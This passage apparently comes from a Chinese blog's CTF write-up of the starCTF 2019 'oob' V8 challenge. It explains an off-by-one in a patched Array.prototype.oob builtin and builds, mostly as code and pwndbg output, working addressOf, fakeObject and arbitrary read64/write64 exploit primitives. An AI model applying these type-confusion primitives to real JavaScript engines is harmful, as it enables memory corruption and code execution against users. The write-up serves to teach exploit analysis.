b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于创建一个数组长度为length时我们可以访问的是第0到length-1个元素，但是该段代码却直接读取和写入第length个元素，这样就造成了off-by-one。</p><p>验证一下，实际上也和我们的分析是一样的</p><p><img src="/2021/04/21/starctf2019-oob/image-20201230164453695.png" alt="image-20201230164453695"></p><h2 id="3、分析利用思路"><a href="#3、分析利用思路" class="headerlink" title="3、分析利用思路"></a>3、分析利用思路</h2><p>首先编写test.js如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, <span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> data = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return data:&quot;</span> + data.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>调试到第一步会给出数组a的object的基址，查看相关job，telescope</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gdb d8</span><br><span class="line">set args --allow-natives-syntax test_jscode/test.js</span><br><span class="line">r</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de49</span></span><br><span class="line"><span class="number">0xf264d68de49</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3e88cd582ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1cf103951111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line"> - properties: <span class="number">0x0f553c540c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x01ac3ca801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x0f264d68de19</span> &lt;FixedDoubleArray[<span class="number">4</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span> <span class="comment">//map, 注意到这个时候0xf264d68de48位置的值是0x3e88cd582ed9</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span><span class="comment">//protype</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span><span class="comment">//elements, 在该object-0x30的位置上</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span>   <span class="comment">//length</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> ◂— <span class="number">0x0</span>  <span class="comment">//properties</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span><span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span><span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span><span class="comment">//1.1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试到第二步，打印到了0xf264d68de48位置处的值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob <span class="keyword">return</span> data:<span class="number">3.3970610731499e-310</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>调试到第三步，对0xf264d68de48进行了写入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de18</span> —▸ <span class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span><span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span><span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span><span class="comment">//1.1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2，本来是object的map值，已经被覆盖修改成浮点数的2</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> —▸ <span class="number">0xf553c540561</span> ◂— <span class="number">0x200000f553c5401</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de70</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de78</span> —▸ <span class="number">0xf553c541ea9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de80</span> ◂— <span class="number">0x2800000003</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>总结一下，当我们不传参数时，可以泄露object的map字段的值，如果传入参数，传入的参数会写入进object的map字段。</p><h2 id="4、编写addressOf和fakeObject原语"><a href="#4、编写addressOf和fakeObject原语" class="headerlink" title="4、编写addressOf和fakeObject原语"></a>4、编写addressOf和fakeObject原语</h2><h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>什么叫做addressOf和fakeObject</p><blockquote><p><strong>计算一个对象的地址addressOf</strong>：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。</p><p><strong>将一个内存地址伪造为一个对象fakeObject</strong>：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。</p></blockquote><p>说白了就是一个可以将对象当作地址，一个可以将地址当作对象。我们拿到这个有什么用呢？</p><h3 id="why"><a href="#why" class="headerlink" title="why"></a>why</h3><p>如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p><p>造成上面的原因在于，v8完全依赖Map类型对js对象进行解析。上面这个逻辑希望能仔细理解一下。</p><p>通过上面两种类型混淆的方式，就能够实现addressOf和fakeObject。</p><p>基于上述分析，如果我们利用oob的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><h3 id="how"><a href="#how" class="headerlink" title="how"></a>how</h3><p>下面我们利用JavaScript实现上述addressOf和fakeObject功能原语。</p><p>首先定义两个全局的Float数组和对象数组，利用oob函数漏洞泄露两个数组的Map类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><p>然后实现下面两个函数，下面两个函数就是+1或-1和换map头的过程</p><p><strong>addressOf 泄露某个object的地址</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;<span class="comment">//将要泄露的对象放到对象数组上</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将对象数组的头替换为float数组的头</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;     <span class="comment">//将对象数组的元素的地址泄露。let类型的变量与var类型的变量相比，限定了作用域，let是在块级作用域有效，而var是全局的变量；-1n其实就是-1，因为1是代表对象的标志，-1就是将对象转变为了地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;   <span class="comment">//返回的是个float</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fakeObject 将某个addr强制转换为object的对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//将地址+1转变为对象</span></span><br><span class="line">    float_array.oob(obj_array_map);   <span class="comment">//将float数组的头替换为对象数组的头</span></span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];   <span class="comment">//将对象变量返回</span></span><br><span class="line">    float_array.oob(float_array_map);    <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj; <span class="comment">//返回的是个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一些gadget，简单的工具代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%DebugPrint(float64);</span><br><span class="line">%DebugPrint(bigUint64);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><h2 id="5、构造任意读写原语"><a href="#5、构造任意读写原语" class="headerlink" title="5、构造任意读写原语"></a>5、构造任意读写原语</h2><p>上面已经将地址转对象和对象转地址的原语构造出来了，现在我们需要利用这两个原语来构造任意地址读写</p><p>我们现在有如下的思路：</p><p>1、fakeObject可以将给定的内存地址转变为object，我们可以在这块地址上面构造object的结构体，然后利用fakeObject将其转化为object</p><p>2、由于这块object完全是我们构造的，所以其中的任何字段都是我们可控的，包括elements字段</p><p>3、我们已经知道elements实际上是个指针，指向elements这个object对象的地址，当我们操作数组元素时，其实操作的就是从elements对象地址+0x10的内存，我们有这样一个思路：将elements位置处的值覆盖为任意地址，这样我们操作数组元素时，操作的就是这块写的任意地址的内存。</p><p>我们直接通过任意读写原语来具体说明下上述过程</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [  <span class="comment">// [+0x40]</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);<span class="comment">// +0x40</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>; <span class="comment">// +0x10</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);<span class="comment">// [+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);<span class="comment">//fake_array[2] == [[+0x40+0x10]+0x10+0x10] == 0x00+0x10+0x10 == 0x20, +0x40++0x10为element的地址，[+0x40+0x10]为element对象，第一个+0x10为element的第[0]个元素，第二个+0x10为element的第[2]个元素,该地址存放的值为i2f(addr - 0x10n + 0x1n)。</span></span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);<span class="comment">//fake_object[0] == [[+0x10+0x10]+0x10] == [[+0x20]+0x10] == [addr-0x10+0x1+0x10] == [addr+0x1]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>描述下上面创建的具体的内存结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>elements_map    <span class="comment">//elements_start</span></span><br><span class="line">+<span class="number">0x8</span>elements_length</span><br><span class="line">+<span class="number">0x10</span>float_array_map<span class="comment">//fake_array[0]; fake_object_addr</span></span><br><span class="line">+<span class="number">0x18</span> <span class="built_in">i2f</span>(<span class="number">0</span>n)    <span class="comment">//fake_array[1]</span></span><br><span class="line">+<span class="number">0x20</span><span class="built_in">i2f</span>(<span class="number">0x41414141</span>n)<span class="comment">//fake_array[2]//elements对象</span></span><br><span class="line">+<span class="number">0x28</span><span class="built_in">i2f</span>(<span class="number">0x1000000000</span>n)<span class="comment">//fake_array[3]</span></span><br><span class="line">+<span class="number">0x30</span><span class="number">1.1</span>   <span class="comment">//fake_array[4]</span></span><br><span class="line">+<span class="number">0x38</span><span class="number">2.2</span>   <span class="comment">//fake_array[5]</span></span><br><span class="line">+<span class="number">0x40</span>map   <span class="comment">//fake_array_addr</span></span><br><span class="line">+<span class="number">0x48</span>prototype</span><br><span class="line">+<span class="number">0x50</span>elements<span class="comment">//value == +0x0</span></span><br><span class="line">+<span class="number">0x58</span>length</span><br><span class="line">+<span class="number">0x60</span>properties</span><br></pre></td></tr></table></figure><p>然后在v8中进行调试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> a_addr = addressOf(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] addressOf a: 0x&quot;</span> + hex(a_addr));</span><br><span class="line"></span><br><span class="line">read64(a_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(a_addr, <span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line"><span class="number">0x1f8b3558fa61</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] addressOf a: <span class="number">0x00001f8b3558fa60</span></span><br><span class="line">[*] leak from: <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x00003f510acc2ed9</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> —▸ <span class="number">0x3f510acc2ed9</span> ◂— <span class="number">0x4000001989b3c01</span><span class="comment">//可以看到将0x1f8b3558fa60处的值0x3f510acc2ed9读取出来了</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100003f510acc2e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] write to : <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x0000000001020304</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span 